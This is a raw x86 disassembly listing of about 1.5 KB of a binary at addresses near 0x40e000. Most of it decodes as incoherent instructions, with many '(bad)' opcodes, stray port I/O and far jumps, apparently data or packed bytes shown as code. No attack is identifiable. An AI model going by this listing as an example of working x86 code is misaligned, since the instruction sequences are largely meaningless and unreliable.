  40ddbc:	or     ebp,DWORD PTR [edx+ebp*4+0x3c]
  40ddc0:	popa   
  40ddc1:	fiadd  DWORD PTR [edx+0x57]
  40ddc4:	addr16 push eax
  40ddc6:	push   ebp
  40ddc7:	into   
  40ddc8:	mov    WORD PTR [ebp+0x1a6a7922],?
  40ddce:	add    al,0xf7
  40ddd0:	push   ebx
  40ddd1:	pop    ebx
  40ddd2:	sbb    al,BYTE PTR [ebx+esi*8]
  40ddd5:	js     0x40dd6c
  40ddd7:	sti    
  40ddd8:	jns    0x40ddbf
  40ddda:	test   al,0x82
  40dddc:	mov    bl,0x35
  40ddde:	test   eax,0xf3a0faef
  40dde3:	(bad)  
  40dde4:	push   eax
  40dde5:	into   
  40dde6:	das    
  40dde7:	xchg   edx,eax
  40dde8:	xchg   edi,eax
  40dde9:	ror    ebp,cl
  40ddeb:	mov    cl,0x7
  40dded:	mov    dh,0xe0
  40ddef:	push   esi
  40ddf0:	int    0xeb
  40ddf2:	out    dx,eax
  40ddf3:	dec    edx
  40ddf4:	xchg   ebx,eax
  40ddf5:	mov    esi,esi
  40ddf7:	mov    al,0x5
  40ddf9:	and    bl,BYTE PTR [eax*1-0x57f1bdec]
  40de00:	dec    edi
  40de01:	fucom  st(7)
  40de03:	mov    ebp,0x98fb9729
  40de08:	je     0x40ddce
  40de0a:	jmp    0x40ddcc
  40de0c:	(bad)  
  40de0e:	ret    
  40de0f:	jbe    0x40de7b
  40de11:	or     bl,BYTE PTR [ecx+0x6a]
  40de14:	add    al,0x5b
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0xe5e0838d
  40de2d:	pop    ebp
  40de2e:	mov    BYTE PTR [esi+0x7f3f7e7e],0x7e
  40de35:	jle    0x40de46
  40de37:	ret    
  40de38:	daa    
  40de39:	pusha  
  40de3a:	ret    0xa326
  40de3d:	popa   
  40de3e:	inc    edi
  40de3f:	mov    cl,0xab
  40de41:	sub    BYTE PTR [ecx+0x56],dh
  40de44:	das    
  40de45:	repz pusha 
  40de47:	sbb    bl,BYTE PTR [edi]
  40de49:	(bad)  
  40de4a:	jge    0x40dec4
  40de4c:	push   ebx
  40de4d:	jmp    0xeabb:0x78c64c76
  40de54:	ins    BYTE PTR es:[edi],dx
  40de55:	push   edi
  40de56:	mov    al,0x75
  40de58:	mov    esp,0x9fccdf90
  40de5d:	mov    BYTE PTR [edi-0xc],dh
  40de60:	xchg   esp,eax
  40de61:	inc    ebx
  40de62:	ret    
  40de63:	sbb    eax,0x568c446
  40de68:	or     BYTE PTR [ebp+0x71],ah
  40de6b:	sub    ah,BYTE PTR [edi]
  40de6d:	xor    BYTE PTR [edx],bh
  40de6f:	mov    cl,0x44
  40de71:	cmp    DWORD PTR [ecx-0x3c],esi
  40de74:	aam    0x31
  40de76:	lods   al,BYTE PTR ds:[esi]
  40de77:	pop    esi
  40de78:	or     BYTE PTR [edi-0x2f],dl
  40de7b:	jae    0x40deef
  40de7d:	stos   BYTE PTR es:[edi],al
  40de7e:	inc    eax
  40de7f:	push   ss
  40de80:	mov    edi,0x4e3c3215
  40de85:	in     eax,dx
  40de86:	cmp    ebx,0x60
  40de89:	ins    BYTE PTR es:[edi],dx
  40de8a:	and    cl,cl
  40de8c:	fadd   QWORD PTR [eax-0x59886ede]
  40de92:	mov    ebx,0xe4a9156e
  40de97:	call   0xbe7d:0x40af6ba6
  40de9e:	stos   DWORD PTR es:[edi],eax
  40de9f:	cli    
  40dea0:	scas   eax,DWORD PTR es:[edi]
  40dea1:	daa    
  40dea2:	pop    ecx
  40dea3:	pop    edi
  40dea4:	retf   
  40dea5:	pop    esp
  40dea6:	ror    DWORD PTR [esi+0x68226539],1
  40deac:	in     al,0xcb
  40deae:	out    0x26,al
  40deb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deb1:	leave  
  40deb2:	or     dh,BYTE PTR [ebx-0x3f]
  40deb5:	push   ebp
  40deb6:	mov    ch,BYTE PTR [ecx-0x60]
  40deb9:	xlat   BYTE PTR ds:[ebx]
  40deba:	mov    bl,0xe3
  40debc:	mov    es,WORD PTR [esi+0x34]
  40debf:	mov    edx,eax
  40dec1:	or     eax,0xe3fada04
  40dec6:	xor    DWORD PTR [edx-0x29974276],esp
  40decc:	cmp    edx,edi
  40dece:	fwait
  40decf:	pop    es
  40ded0:	scas   eax,DWORD PTR es:[edi]
  40ded1:	bound  esp,QWORD PTR [ebp+0x36bf37c9]
  40ded7:	jb     0x40ded0
  40ded9:	sar    DWORD PTR [ebx-0x1401c8dc],1
  40dedf:	pop    edx
  40dee0:	popa   
  40dee1:	loope  0x40df17
  40dee3:	xchg   DWORD PTR [edx],edi
  40dee5:	sub    eax,0x82086d18
  40deea:	mov    ebp,ebx
  40deec:	aas    
  40deed:	fstp   TBYTE PTR [ebx+0x7]
  40def0:	and    bl,BYTE PTR [eax]
  40def2:	aaa    
  40def3:	jb     0x40deb1
  40def5:	mov    bh,BYTE PTR [ebx-0x59]
  40def8:	and    DWORD PTR [edx-0x55],0x8fed6781
  40deff:	mov    ds,WORD PTR [esp+esi*1+0x7]
  40df03:	add    ebx,DWORD PTR ds:0xaccc3097
  40df09:	inc    ecx
  40df0a:	imul   ecx,DWORD PTR [ebp-0x34],0x4
  40df0e:	enter  0xd5ce,0xa4
  40df12:	jge    0x40df6c
  40df14:	ret    0x47ab
  40df17:	mov    ch,0x4c
  40df19:	mov    dh,0x2a
  40df1b:	out    dx,eax
  40df1c:	push   es
  40df1d:	mov    bh,0x41
  40df1f:	test   al,0x95
  40df21:	push   edi
  40df22:	inc    ebx
  40df23:	xchg   edx,eax
  40df24:	cwde   
  40df25:	lahf   
  40df26:	mov    ds:0xd84a519d,eax
  40df2b:	jp     0x40defe
  40df2d:	outs   dx,BYTE PTR ds:[esi]
  40df2e:	sahf   
  40df2f:	pop    edx
  40df30:	mov    ebp,0x700354b5
  40df35:	mov    ds:0x6af44a10,al
  40df3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df3b:	push   ss
  40df3c:	cmp    cl,bh
  40df3e:	jp     0x40df8d
  40df40:	sub    BYTE PTR [esi+0x4c7001ea],0xda
  40df47:	in     eax,dx
  40df48:	add    DWORD PTR [ebp+0x7966a872],eax
  40df4e:	(bad)  
  40df4f:	ins    BYTE PTR es:[edi],dx
  40df50:	imul   esi,DWORD PTR ds:0x5299f5ce,0xffffffc0
  40df57:	fbld   TBYTE PTR [edi-0x3a3f7038]
  40df5d:	and    DWORD PTR [ebx],eax
  40df5f:	xor    ebx,esp
  40df61:	es push 0xffffffe9
  40df64:	adc    bl,BYTE PTR [eax]
  40df66:	push   ebx
  40df67:	xchg   ebx,eax
  40df68:	pop    edx
  40df69:	adc    al,0xba
  40df6b:	fiadd  WORD PTR [ecx+0x2710b188]
  40df71:	pop    ds
  40df72:	dec    esp
  40df73:	arpl   sp,sp
  40df75:	xor    ecx,DWORD PTR [eax+0x2b]
  40df78:	fld    DWORD PTR [edi+0x458b49cb]
  40df7e:	in     al,0xf
  40df80:	scas   eax,DWORD PTR es:[edi]
  40df81:	rol    DWORD PTR [ebx],0xe0
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	sar    eax,1
  40dfa8:	sbb    BYTE PTR [edi+0x7e8787c0],0x7e
  40dfaf:	aas    
  40dfb0:	jg     0x40e030
  40dfb2:	jle    0x40df5a
  40dfb4:	stc    
  40dfb5:	call   0x7f730258
  40dfba:	inc    esp
  40dfbb:	jge    0x40dfb8
  40dfbd:	jns    0x40e021
  40dfbf:	xor    DWORD PTR ss:[esi],ebx
  40dfc2:	push   es
  40dfc3:	jae    0x40df9e
  40dfc5:	out    dx,eax
  40dfc6:	outs   dx,BYTE PTR ds:[esi]
  40dfc7:	arpl   WORD PTR [esi+0x63],cx
  40dfca:	les    esi,FWORD PTR [edx-0x2da59a01]
  40dfd0:	xchg   ecx,eax
  40dfd1:	scas   al,BYTE PTR es:[edi]
  40dfd2:	retf   
  40dfd3:	jl     0x40df93
  40dfd5:	and    eax,0x75abeb9b
  40dfda:	cmp    eax,0x77599278
  40dfdf:	ja     0x40df8b
  40dfe1:	or     al,0xcb
  40dfe3:	retf   
  40dfe4:	fwait
  40dfe5:	out    0xbb,al
  40dfe7:	inc    edx
  40dfe8:	cmp    eax,0xbfb2f6a5
  40dfed:	adc    bl,BYTE PTR [eax]
  40dfef:	fidivr WORD PTR [ebx+0x49883339]
  40dff5:	and    esi,DWORD PTR [ebx-0x1ec4be98]
  40dffb:	mov    cl,0xf2
  40dffd:	push   0x65ce05a9
  40e002:	js     0x40df8b
  40e004:	pusha  
  40e005:	(bad)  
  40e006:	pop    ebp
  40e007:	leave  
  40e008:	add    dh,al
  40e00a:	mov    al,ds:0x9b7c6aea
  40e00f:	mov    esp,0x8a8c6c4a
  40e014:	iret   
  40e015:	jb     0x40e05f
  40e017:	push   ebx
  40e018:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40e01a:	mov    ebx,0xd8342bd3
  40e01f:	jmp    0x40e053
  40e021:	lock mov cs,WORD PTR [ebx+0x348bb2d0]
  40e028:	and    BYTE PTR [esi-0x3f],bl
  40e02b:	xlat   BYTE PTR ds:[ebx]
  40e02c:	fndisi(8087 only) 
  40e02e:	xor    eax,0x2f766395
  40e033:	xchg   eax,esi
  40e035:	scas   eax,DWORD PTR es:[edi]
  40e036:	push   ss
  40e037:	sbb    BYTE PTR [ecx],dl
  40e039:	and    DWORD PTR [ebp+0x4a901ce9],esp
  40e03f:	ret    0xd9eb
  40e042:	sub    DWORD PTR [ecx+0x2d],edi
  40e045:	int3   
  40e046:	fs push ebp
  40e048:	jle    0x40e078
  40e04a:	mov    esi,0x7b7680cc
  40e04f:	jl     0x40e09f
  40e051:	popf   
  40e052:	stc    
  40e053:	aam    0x14
  40e055:	mov    esi,0x81b5f4b2
  40e05a:	jg     0x40dfec
  40e05c:	jmp    0xf4226fd4
  40e061:	into   
  40e062:	fsubr  st,st(7)
  40e064:	add    ebp,esi
  40e066:	ja     0x40e098
  40e068:	cmp    ch,BYTE PTR [eax-0x21d224cf]
  40e06e:	addr16 mov ebp,0x92083d97
  40e074:	jecxz  0x40e09b
  40e076:	push   esp
  40e077:	arpl   WORD PTR [eax-0xcdb0fd8],si
  40e07d:	mov    edi,0x48a350e3
  40e082:	addr16 jg 0x40e0e5
  40e085:	das    
  40e086:	in     eax,dx
  40e087:	and    al,0xd
  40e089:	scas   eax,DWORD PTR es:[edi]
  40e08a:	dec    ecx
  40e08b:	sbb    DWORD PTR [edi+0x6c],0x41
  40e08f:	cmp    BYTE PTR [edx-0x7f],ah
  40e092:	in     al,0xfc
  40e094:	pop    esp
  40e095:	jae    0x40e092
  40e097:	mov    eax,0x92df2298
  40e09c:	popf   
  40e09d:	test   dl,dl
  40e09f:	jge    0x40e0d4
  40e0a1:	clc    
  40e0a2:	jae    0x40e103
  40e0a4:	test   DWORD PTR [eax+0x6d],ebx
  40e0a7:	int    0xee
  40e0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0aa:	mov    esp,0x72185f1
  40e0af:	test   DWORD PTR [edx+0x21],edx
  40e0b2:	push   cs
  40e0b3:	xchg   DWORD PTR [esi-0x76],ebx
  40e0b6:	in     eax,0xb6
  40e0b8:	sbb    eax,0x14d7c6d8
  40e0bd:	(bad)  
  40e0be:	jl     0x40e0f5
  40e0c0:	adc    BYTE PTR [eax+0x453edec9],0x2e
  40e0c7:	adc    eax,0x567ad44d
  40e0cc:	fiadd  WORD PTR [edx+0x2f]
  40e0cf:	cmc    
  40e0d0:	push   0x8
  40e0d2:	outs   dx,DWORD PTR ds:[esi]
  40e0d3:	cld    
  40e0d4:	test   BYTE PTR [esi-0x14c6e9d9],bl
  40e0da:	add    eax,0x919879c
  40e0df:	mov    esi,0x746fc2b7
  40e0e4:	pop    ebp
  40e0e5:	xor    DWORD PTR [esi+0x2b],0x708e500f
  40e0ec:	jbe    0x40e0b2
  40e0ee:	jle    0x40e121
  40e0f0:	xor    DWORD PTR [esp+edx*1-0x35],eax
  40e0f4:	mov    eax,DWORD PTR [ebp-0xc]
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
